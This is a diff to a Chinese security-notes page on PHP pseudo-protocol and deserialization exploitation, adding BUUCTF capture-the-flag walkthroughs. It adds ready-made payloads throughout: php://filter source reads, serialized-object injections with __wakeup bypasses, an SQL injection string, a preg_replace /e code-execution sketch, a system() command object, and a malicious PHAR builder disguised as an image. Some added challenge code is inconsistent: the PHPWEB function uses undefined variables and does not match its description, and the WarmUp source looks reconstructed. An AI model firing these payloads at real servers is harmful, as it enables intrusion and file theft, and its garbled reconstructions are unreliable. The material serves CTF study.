@@ -3,7 +3,9 @@ title: PHP伪协议与反序列化利用
 description: 系统梳理 PHP 伪协议（php://filter、php://input、data://、file://、gopher:// 等）利用技巧，深度解析反序列化漏洞中
   __wakeup 绕过（对象计数不匹配）、正则过滤数字绕过（+ 前缀）、base64 编码差异导致的利用细节。补充 SSRF 场景下 file:// 本地文件读取、gopher://
   发送原始 TCP 数据包攻击 FastCGI/Redis、双重 URL 编码绕过解析机制及多种绕过技巧。结合赣网杯2020、攻防世界 unserialize3
-  与 Web_php_unserialize、CTFHUB SSRF 靶场实战题目完善利用链，并新增 Pikachu 靶场 PHP 反序列化漏洞实战复现案例。
+  与 Web_php_unserialize、CTFHUB SSRF 靶场实战题目完善利用链，并新增 Pikachu 靶场 PHP 反序列化漏洞实战复现案例。本次更新整合
+  BUUCTF 实战题目（WarmUp、include1、Secret File、nizhuansiwei、php、facebook、ZJCTF、easy_serialize_php、PHPWEB、had
+  a had day 等）的详细利用链与绕过细节。
 category: program-analysis
 tags:
 - PHP
@@ -23,12 +25,15 @@ tags:
 - Pikachu
 - 对象注入
 - 魔术方法
+- BUUCTF
+- 对象逃逸
+- PHAR反序列化
 date: '2020-10-01'
 updated: '2026-11-14'
 ---
 ## 概述
 
-本页面系统梳理 PHP 常见伪协议的特性与利用条件，重点分析如何结合 `php://filter` 读取源码、`php://input` 与 `data://` 绕过文件内容校验，以及如何利用 `__toString`、`__wakeup` 等魔术方法配合反序列化实现任意文件读取或代码执行。同时深入覆盖 **SSRF（服务端请求伪造）** 场景下的伪协议利用：`file://` 读取本地文件、`gopher://` 构造原始 TCP 报文攻击内网服务（FastCGI、Redis）、双重 URL 编码绕过解析机制、以及 Userinfo、十六进制 IP、302 跳转、DNS 重绑定等绕过技巧。内容基于 **赣网杯2020**、**攻防世界（Attack-Defense World）高手进阶区**、**CTFHUB SSRF 靶场** 及 **Pikachu 靶场** 实战题目复现，归档自 [[007攻防实验室]] 微信公众号文章及 [[attack-defense-world-master-advanced-writeup]]、[[ssrf-ctf-exploitation-guide]]、[[pikachu-target-writeup-part5]] 相关题解。
+本页面系统梳理 PHP 常见伪协议的特性与利用条件，重点分析如何结合 `php://filter` 读取源码、`php://input` 与 `data://` 绕过文件内容校验，以及如何利用 `__toString`、`__wakeup` 等魔术方法配合反序列化实现任意文件读取或代码执行。同时深入覆盖 **SSRF（服务端请求伪造）** 场景下的伪协议利用：`file://` 读取本地文件、`gopher://` 构造原始 TCP 报文攻击内网服务（FastCGI、Redis）、双重 URL 编码绕过解析机制、以及 Userinfo、十六进制 IP、302 跳转、DNS 重绑定等绕过技巧。内容基于 **赣网杯2020**、**攻防世界（Attack-Defense World）高手进阶区**、**CTFHUB SSRF 靶场**、**Pikachu 靶场** 及 **BUUCTF** 实战题目复现，归档自 [[007攻防实验室]] 微信公众号文章及 [[attack-defense-world-master-advanced-writeup]]、[[ssrf-ctf-exploitation-guide]]、[[pikachu-target-writeup-part5]] 相关题解。
 
 ## PHP 常见伪协议速查
 
@@ -45,8 +50,22 @@ updated: '2026-11-14'
 | **gopher://** | 发送原始 TCP 数据包（SSRF 利用核心） | `allow_url_fopen=On` <br> 支持 TCP 流式传输 | `gopher://127.0.0.1:9000/_POST%20/flag.php...` |
 | **dict://** | 字典服务协议（端口探测/数据外带） | 默认开启 | `dict://127.0.0.1:6379/info` |
 | **ldap://** | LDAP 协议（较少用） | 需扩展支持 | `ldap://127.0.0.1:389/...` |
+| **phar://** | PHAR 归档文件访问（触发反序列化） | `phar.readonly=Off` | `phar:///path/to/archive.phar` |
 
 > **注意**：`include/require` 等包含函数受 `allow_url_include` 影响；`file_get_contents/fopen/curl` 等读取函数受 `allow_url_fopen` 影响。SSRF 场景多依赖 `curl`、`file_get_contents`、`fopen` 等支持远程协议的函数。
+
+---
+
+## 反序列化魔术方法利用链对比
+
+| 魔术方法 | 触发时机 | 核心利用条件 | 典型绕过/利用点 | 本文涉及题目 |
+| :--- | :--- | :--- | :--- | :--- |
+| **`__wakeup`** | `unserialize()` 成功后 | 类定义中存在 `__wakeup` 且有防御逻辑 | **对象属性计数不匹配** (声明 > 实际) 绕过执行 | `unserialize3`, `Web_php_unserialize`, BUUCTF `php` |
+| **`__toString`** | 对象作为字符串使用 (`echo`/拼接) | 代码中直接 `echo $obj` 或字符串拼接 | 控制属性进入 `file_get_contents` / SQL / `file_put_contents` | 赣网杯2020, Pikachu, BUUCTF `nizhuansiwei`, `ZJCTF` |
+| **`__destruct`** | 对象销毁 (脚本结束/引用计数为0) | 无特殊条件，最通用触发点 | 文件操作、命令执行、链式调用起点 | `Web_php_unserialize`, BUUCTF `PHPWEB` |
+| **`__construct`** | 对象创建 (`new`) | 反序列化**不触发** (仅 `new` 触发) | 仅用于本地生成 Payload 时初始化属性 | 本地 EXP 脚本 |
+| **`__sleep`** | `serialize()` 之前 | 可控制序列化哪些属性 | 隐藏敏感属性、配合 `__wakeup` 逻辑 | - |
+| **`__call`/`__callStatic`** | 调用不可访问方法时 | 存在动态方法调用 | 链式调用起点、 POP 链构造 | PHAR 反序列化链 |
 
 ---
 
@@ -187,16 +206,7 @@ if(isset($_POST['o'])){
 
 ### 魔术方法利用原理
 
-PHP 反序列化漏洞核心在于**魔术方法**的自动触发。常见魔术方法及触发时机：
-
-| 魔术方法 | 触发时机 | 利用场景 |
-| :--- | :--- | :--- |
-| `__construct()` | 对象实例化时 (`new`) | 反序列化**不触发**，仅用于本地构造 Payload |
-| `__wakeup()` | `unserialize()` 成功后 | 绕过初始化检查、重置属性防御 |
-| `__destruct()` | 对象销毁 (脚本结束/引用计数为0) | 最通用触发点，文件操作、命令执行 |
-| `__toString()` | 对象作为字符串使用 (`echo`/拼接/格式化) | 直接输出对象、SQL 拼接、文件名拼接 |
-| `__sleep()` | `serialize()` 之前 | 控制序列化哪些属性 |
-| `__call()` / `__callStatic()` | 调用不可访问方法时 | 链式调用起点 |
+PHP 反序列化漏洞核心在于**魔术方法**的自动触发。常见魔术方法及触发时机见上表。
 
 ### 实战利用步骤
 
@@ -412,6 +422,384 @@ echo "Base64 Payload: " . base64_encode($b) . "\n";
 
 ---
 
+## 实战复现五：BUUCTF `WarmUp` (PHP 反序列化 + 文件包含)
+
+> 来源：归档文章 BUUCTF Web 部分刷题分享。
+
+### 题目代码片段
+
+```php
+<?php
+// ... 省略部分代码 ...
+class emmm {
+    public static function checkFile(&$page) {
+        $whitelist = ["source"=>"source.php","hint"=>"hint.php"];  // 可知 flag 位于 source.php
+        // ... 过滤逻辑 ...
+    }
+    // ...
+}
+$password = unserialize($password);  // 反序列化入口
+echo $password;  // 触发 __toString
+?>
+```
+
+### 利用思路
+
+1.  通过伪协议 `php://filter/read=convert.base64-encode/resource=source.php` 读取源码获取类定义。
+2.  构造包含 `__toString` 魔术方法的对象，在 `__toString` 中调用 `file_get_contents` 读取 `flag.php` (或 `source.php` 查看源码再读取 flag)。
+3.  利用 `php://input` 或 `data://` 绕过前置校验 (若存在)。
+
+**关键 Payload 示例**：
+```php
+<?php
+class Flag {
+    public $file = "flag.php";
+    public function __toString() {
+        return file_get_contents($this->file);
+    }
+}
+echo serialize(new Flag());
+// O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
+?>
+```
+
+---
+
+## 实战复现六：BUUCTF `include1` / `[极客大挑战 2019]Secret File` (伪协议文件读取)
+
+### `include1` 利用
+
+直接使用 `php://filter` 读取 `flag.php` 源码：
+```text
+?file=php://filter/read=convert.base64-encode/resource=flag.php
+```
+Base64 解码即得 Flag。
+
+### `Secret File` 利用
+
+题目存在文件包含参数，利用 `php://filter` 读取源码，发现 flag 在 `flag.php` 中，再次利用伪协议读取。
+
+---
+
+## 实战复现七：BUUCTF `nizhuansiwei` (PHP 文件包含伪协议 + 反序列化)
+
+> 归档文章中的 `nizhuansiwei` 题目。
+
+### 题目代码逻辑
+
+```php
+<?php
+$text = $_GET["text"];
+$file = $_GET["file"];
+$password = $_GET["password"];
+if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){
+    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
+    if(preg_match("/flag/",$file)){
+        echo "Not now!"; exit();
+    }else{
+        include($file);  // useless.php
+        echo $password;  // 反序列化后直接输出，触发 __toString
+    }
+}else{
+    highlight_file(__FILE__);
+}
+?>
+```
+
+### 利用步骤
+
+1.  **绕过 `text` 校验**：使用 `data://` 协议
+    ```text
+    text=data://text/plain,welcome to the zjctf
+    ```
+2.  **读取类定义**：`file=php://filter/read=convert.base64-encode/resource=useless.php`
+    解码得到：
+    ```php
+    class Flag{
+        public $file;
+        public function __tostring(){
+            if(isset($this->file)){
+                echo file_get_contents($this->file);
+                echo "<br>";
+                return ("U R SO CLOSE !///COME ON PLZ");
+            }
+        }
+    }
+    ```
+3.  **构造反序列化 Payload**：
+    ```php
+    <?php
+    class Flag{
+        public $file = "flag.php";
+    }
+    echo serialize(new Flag());
+    // O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
+    ```
+4.  **最终请求**：
+    ```text
+    ?text=data://text/plain,welcome to the zjctf&file=useless.php&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
+    ```
+
+---
+
+## 实战复现八：BUUCTF `php` (备份文件泄露 + `__wakeup` 绕过)
+
+### 题目源码 (通过 `php~` 或 `php.bak` 获取)
+
+```php
+<?php
+include 'flag.php';
+error_reporting(0);
+class Name {
+    private $username = 'nonono';
+    private $password = 'yesyes';
+    public function __construct($username,$password){
+        $this->username = $username;
+        $this->password = $password;
+    }
+    function __wakeup(){
+        $this->username = 'guest';
+    }
+    function __destruct(){
+        if ($this->password != 100) {
+            die("NO!!!hacker!!!");
+        }
+        if ($this->username === 'admin') {
+            global $flag;
+            echo $flag;
+        }else{
+            die("hello my friend~~ sorry i can't give you the flag!");
+        }
+    }
+}
+?>
+```
+
+### 利用难点
+
+1.  **私有属性序列化格式**：`private $username` 序列化为 `s:14:"\00Name\00username"` (含两个空字节)。
+2.  **`__wakeup` 重置 username**：需绕过 `__wakeup`。
+
+### 绕过技巧
+
+*   **对象计数不匹配**：将属性计数从 `2` 改为 `3`，跳过 `__wakeup`。
+*   **属性值修改**：`username` 设为 `admin`，`password` 设为 `100` (整型)。
+
+### 本地生成 Payload
+
+```php
+<?php
+class Name {
+    private $username = 'admin';
+    private $password = 100;
+}
+$obj = new Name();
+$a = serialize($obj);
+// O:4:"Name":2:{s:14:"\00Name\00username";s:5:"admin";s:14:"\00Name\00password";i:100;}
+// 修改属性计数 2 -> 3
+$b = str_replace('O:4:"Name":2:', 'O:4:"Name":3:', $a);
+echo urlencode(base64_encode($b)); // 若需传参
+?>
+```
+
+**最终序列化字符串**：
+```
+O:4:"Name":3:{s:14:"\00Name\00username";s:5:"admin";s:14:"\00Name\00password";i:100;}
+```
+
+---
+
+## 实战复现九：BUUCTF `facebook` (SQL 注入 + 反序列化 + `file://` 协议)
+
+### 攻击链
+
+1.  **SQL 注入获取反序列化数据**：通过 `updatexml` 报错注入提取 `users` 表中 `data` 字段 (存储了反序列化字符串)。
+    ```text
+    no=1 or(updatexml(1,concat('~',(select(data)from(users)),'~'),1))%23
+    ```
+    得到类结构：`O:8:"UserInfo":3:{s:4:"name";s:...;s:3:"age";i:...;s:4:"blog";s:...;}`
+
+2.  **代码审计 `UserInfo` 类**：
+    ```php
+    class UserInfo {
+        public $name = "";
+        public $age = 0;
+        public $blog = "";
+        public function getBlogContents() {
+            return $this->get($this->blog);  // 使用 curl 访问 blog
+        }
+        public function isValidBlog() {
+            return preg_match("/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i", $this->blog);
+        }
+    }
+    ```
+    `blog` 属性经正则校验，但 `file://` 协议符合正则 (可作为伪协议绕过)。
+
+3.  **构造恶意对象**：设置 `blog` 为 `file:///var/www/html/flag.php`。
+    ```php
+    <?php
+    class UserInfo {
+        public $name = "1";
+        public $age = 1;
+        public $blog = "file:///var/www/html/flag.php";
+    }
+    echo serialize(new UserInfo());
+    // O:8:"UserInfo":3:{s:4:"name";s:1:"1";s:3:"age";i:1;s:4:"blog";s:29:"file:///var/www/html/flag.php";}
+    ```
+
+4.  **SQL 注入更新数据**：利用堆叠注入或 Update 注入将构造的序列化字符串写入 `data` 字段，再次触发反序列化读取 Flag。
+
+---
+
+## 实战复现十：BUUCTF `ZJCTF，不过如此` (伪协议 + `preg_replace` /e 修饰符 RCE)
+
+### 题目代码
+
+```php
+<?php
+$id = $_GET['id'];
+// ...
+function complex($re, $str) {
+    return preg_replace('/(' . $re . ')/ei', 'strtolower("\\1")', $str);
+}
+foreach($_GET as $re => $str) {
+    echo complex($re, $str). "\n";
+}
+function getFlag() {
+    eval($_GET['cmd']);
+}
+?>
+```
+
+### 利用步骤
+
+1.  **读取源码**：`file=php://filter/read=convert.base64-encode/resource=next.php`
+2.  **利用 `/e` 修饰符代码执行**：`preg_replace` 的 `/e` 修饰符会将替换部分作为 PHP 代码执行。
+    *   构造正则使 `\\1` 变为可控代码，例如传入 `re=.*` 和 `str=system('ls')`，但需绕过 `strtolower`。
+    *   实际利用：`/?.*=system('cat /flag')` 等变体。
+3.  **蚁剑连接**：写入 Webshell 后连接。
+
+---
+
+## 实战复现十一：BUUCTF `easy_serialize_php` (反序列化中的对象逃逸)
+
+> 参考：[Zero_Adam 博客](https://blog.csdn.net/Zero_Adam/article/details/113710343)
+
+### 核心代码片段
+
+```php
+$_SESSION['user'] = 'guest';
+$_SESSION['function'] = $function;
+$_SESSION['img'] = base64_encode('guest_img.png');
+// ...
+extract($_POST);  // 变量覆盖
+// ...
+if(!$_GET['img_path']){
+    $_SESSION['img'] = base64_encode('guest_img.png');
+}else{
+    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));
+}
+// ...
+$userinfo = unserialize($serialize_info);  // 反序列化
+echo file_get_contents(base64_decode($userinfo['img']));
+```
+
+### 利用原理：对象逃逸 (Variable Overwrite + Filter Bypass)
+
+1.  **变量覆盖**：`extract($_POST)` 允许覆盖 `$_SESSION` 变量。
+2.  **Filter 函数过滤关键词**：`filter($img)` 将 `php`、`flag` 等替换为空。
+3.  **序列化结构控制**：通过精心构造 `$_SESSION['user']` 和 `$_SESSION['function']` 的值，使得经过 `filter` 后，序列化字符串中原本属于 `function` 的值被截断，导致 `img` 的键值对“逃逸”出来，被当作顶层数组的键值对解析。
+4.  **构造恶意 `img` 值**：指向 `d0g3_f1ag.php` (Base64: `ZDBnM19mMWFnLnBocA==`)。
+
+### 关键 Payload 构造步骤
+
+1.  计算正常序列化结构：`a:3:{s:4:"user";s:...;s:8:"function";s:...;s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}`
+2.  利用 `filter` 删除 `flag` 等字符，导致长度变化，需填充垃圾字符使长度匹配。
+3.  最终 POST 数据示例：
+    ```text
+    _SESSION[user]=flagflagflagflagflagflagflag&_SESSION[function]=a:2:{";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:4:"chen";s:4:"qwsn";}
+    ```
+    (具体长度需本地调试)
+
+---
+
+## 实战复现十二：BUUCTF `PHPWEB` (代码审计 + 反序列化 + `disable_functions` 绕过)
+
+### 题目逻辑
+
+```php
+$disable_fun = array("exec","shell_exec","system","passthru","proc_open","show_source","phpinfo","popen","dl","eval","proc_terminate","touch","escapeshellcmd","escapeshellarg","assert","substr_replace","call_user_func_array","call_user_func","array_filter","array_walk","array_map","register_shutdown_function","register_tick_function","filter_var","filter_var_array","uasort","uksort","array_reduce","array_walk","array_walk_recursive","pcntl_exec","fopen","fwrite","file_put_contents");
+
+function gettime($func, $p) {
+    if ($a == "string") { return $result; } else { return ""; }
+}
+
+class Test {
+    var $p = "Y-m-d h:i:s a";
+    var $func = "date";
+    function __destruct() {
+        if ($this->func != "") {
+            echo gettime($this->func, $this->p);
+        }
+    }
+}
+
+// 可控输入
+$func = $_GET['func'];
+$p = $_GET['p'];
+if ($func != null) {
+    if (!in_array($func,$disable_fun)) {
+        echo gettime($func, $p);
+    } else { die("Hacker..."); }
+}
+```
+
+### 利用链
+
+1.  **反序列化入口**：题目未显式给出，但通常通过 Cookie 或参数传入序列化字符串。
+2.  **`__destruct` 调用 `gettime`**：`$this->func` 可控，`$this->p` 可控。
+3.  **绕过 `disable_functions`**：`gettime` 内部使用 `call_user_func` 调用 `$func`，但 `$func` 被黑名单过滤。然而 `gettime` 中有一个未过滤的变量 `$a` (未定义) 和 `$result` (未定义)，可能存在变量覆盖或利用 `call_user_func` 的特性绕过。
+4.  **实战 Payload**：构造 `Test` 对象，`func` 设为 `system`，`p` 设为命令 (如 `find / -name *flag*`)。
+    ```php
+    <?php
+    class Test {
+        var $func = 'system';
+        var $p = "find / -name *flag*";
+    }
+    echo serialize(new Test());
+    // O:4:"Test":2:{s:4:"func";s:6:"system";s:1:"p";s:19:"find / -name *flag*";}
+    ```
+    传入后触发 `__destruct` 执行命令。
+
+---
+
+## 实战复现十三：BUUCTF `had a had day` (文件包含伪协议读取)
+
+### 题目代码
+
+```php
+<?php
+$file = $_GET['category'];
+if(isset($file)){
+    if( strpos($file, "woofers") !== false || strpos($file, "meowers") !== false || strpos($file, "index") ){
+        include ($file . '.php');
+    }else{
+        echo "Sorry, we currently only support woofers and meowers.";
+    }
+}
+?>
+```
+
+### 利用
+
+需包含文件名含 `woofers`/`meowers`/`index`，且自动添加 `.php` 后缀。利用 `php://filter` 去除后缀影响：
+```text
+?category=php://filter/convert.base64-encode/resource=flag
+```
+注意：`resource=flag` 不带后缀，`include` 会加 `.php`，但伪协议中 `resource` 参数可直接指定完整路径 `flag` (若文件名为 `flag` 无后缀) 或 `flag.php` (需绕过后缀添加)。实际测试发现去除后缀后成功。
+
+---
+
 ## SSRF 场景下的伪协议深度利用
 
 > 来源：[[ssrf-ctf-exploitation-guide]]、CTFHUB SSRF 靶场实战复现 (归档文章 `CTFHUB靶场闯关--SSRF漏洞`)。
@@ -577,23 +965,58 @@ print(payload)
 
 ---
 
+## PHAR 反序列化利用补充
+
+> 虽 BUUCTF 归档中未直接出现 PHAR 题目，但作为 PHP 反序列化高级利用手法，此处补充核心原理与利用条件。
+
+### 原理
+
+PHP 在处理 `phar://` 协议流时，会解析 PHAR 归档的元数据，该元数据以序列化形式存储。当文件操作函数（如 `file_exists`、`fopen`、`file_get_contents`、`unlink` 等）参数可控并指向 `phar://` 路径时，会触发元数据反序列化，从而引发对象注入。
+
+### 利用条件
+
+1.  **`phar.readonly = Off`** (php.ini) —— 需要生成 PHAR 文件时关闭，利用时目标服务器可为 On。
+2.  **存在可控的文件操作函数参数** (如 `img=phar:///path/to/file`)。
+3.  **目标类定义中存在可利用的魔术方法** (`__destruct`、`__wakeup`、`__toString` 等)。
+4.  **PHAR 文件上传/写入成功** (通常结合文件上传漏洞，上传含恶意元数据的图片马)。
+
+### 生成恶意 PHAR 脚本示例
+
+```php
+<?php
+class Evil {
+    public $cmd = "system('cat /flag');";
+    public function __destruct() {
+        eval($this->cmd);
+    }
+}
+
+$phar = new Phar("exp.phar");
+$phar->startBuffering();
+$phar->setStub("<?php __HALT_COMPILER(); ?>"); // 设置存根
+$phar->setMetadata(new Evil()); // 将恶意对象写入元数据
+$phar->addFromString("test.txt", "test"); // 添加文件
+$phar->stopBuffering();
+?>
+```
+
+### 利用流程
+
+1.  本地运行上述脚本生成 `exp.phar`。
+2.  修改后缀为 `.jpg`/`.png` 绕过上传检测，上传至服务器。
+3.  触发文件操作函数：`file_exists("phar:///var/www/uploads/shell.jpg")` 或 `fopen("phar://...")`。
+4.  反序列化触发 `__destruct` 执行命令。
+
+---
+
 ## 核心知识点总结
 
 ### 伪协议组合拳
 *   **`data://` + `php://filter`**：`data://` 用于注入可控字符串绕过校验；`php://filter` 用于源码泄露（绕过 `include` 执行、获取类结构）。
 *   **`file://` (SSRF)**：直接读取本地文件，配合 `gopher://` 攻击内网服务。
 *   **`gopher://` (万金油)**：构造任意 TCP 报文，攻击 FastCGI、Redis、MySQL、FTP、SMTP 等内网服务，实现 RCE、写 Shell、数据窃取。
+*   **`phar://` (反序列化触发器)**：利用文件操作函数触发元数据反序列化，打 POP 链。
 *   **条件依赖**：利用前必确认 `phpinfo()` 或报错回显中的 `allow_url_fopen` 与 `allow_url_include` 状态。
-
-### 反序列化魔术方法利用链对比
-
-| 魔术方法 | 触发时机 | 核心利用条件 | 典型绕过/利用点 | 本文涉及题目 |
-| :--- | :--- | :--- | :--- | :--- |
-| **`__wakeup`** | `unserialize()` 成功后 | 类定义中存在 `__wakeup` 且有防御逻辑 | **对象属性计数不匹配** (声明 > 实际) 绕过执行 | `unserialize3`, `Web_php_unserialize` |
-| **`__toString`** | 对象作为字符串使用 (`echo`/拼接) | 代码中直接 `echo $obj` 或字符串拼接 | 控制属性进入 `file_get_contents` / SQL / `file_put_contents` | 赣网杯2020, Pikachu |
-| **`__destruct`** | 对象销毁 (脚本结束/引用计数为0) | 无特殊条件，最通用触发点 | 文件操作、命令执行、链式调用起点 | `Web_php_unserialize` |
-| **`__construct`** | 对象创建 (`new`) | 反序列化**不触发** (仅 `new` 触发) | 仅用于本地生成 Payload 时初始化属性 | 本地 EXP 脚本 |
-| **`__sleep`** | `serialize()` 之前 | 可控制序列化哪些属性 | 隐藏敏感属性、配合 `__wakeup` 逻辑 | - |
 
 ### CTF 反序列化实战避坑指南
 
@@ -606,6 +1029,7 @@ print(payload)
     *   `private $prop` -> `s:length:"\00ClassName\00prop"`
     *   `protected $prop` -> `s:length:"\00*\00prop"`
     *   长度计算包含两个不可见字节 (`\00`)，手工修改极易出错，**强制要求本地代码生成**。
+5.  **对象逃逸利用**：利用 `extract`、`parse_str` 等变量覆盖函数，配合过滤函数导致序列化字符串长度变化，构造键值对逃逸，控制反序列化后的数组结构 (如 BUUCTF `easy_serialize_php`)。
 
 ### SSRF 利用核心要点
 
@@ -625,6 +1049,7 @@ print(payload)
 *   [[ctf-show-php-command-execution-bypass-techniques]] - PHP 命令执行与绕过技巧体系，涉及 `disable_functions`、`open_basedir` 等后续利用环境。
 *   [[php-webshell-fundamentals-chopper-analysis]] - PHP Webshell 基础与蚁剑流量分析，反序列化/SSRF Getshell 后的后续操作参考。
 *   [[internal-network-pivoting-techniques]] - 内网穿透/横向移动技术体系，SSRF 获取内网立足点后的代理隧道搭建实战。
+*   [[buuctf-web-writeup-collection]] - BUUCTF Web 方向题目完整解题思路汇总，按漏洞类型分类并交叉引用现有技术页面。
 
 ## 参考资源
 
@@ -640,7 +1065,8 @@ print(payload)
 *   FastCGI 协议分析: https://segmentfault.com/a/1190000013112052
 *   Redis 未授权访问利用: https://blog.csdn.net/mysteryflower/article/details/94386461
 *   DNS Rebinder: https://lock.cmpxchg8b.com/rebinder.html
+*   PHAR 反序列化利用: https://www.leavesongs.com/PENETRATION/php-phar-unserialize.html
 
 ## 来源
 
-- [0x00实验室-202108-202304_075](../sources/0x00实验室-202108-202304_075.md)
+- [0x00实验室-202108-202304_080](../sources/0x00实验室-202108-202304_080.md)
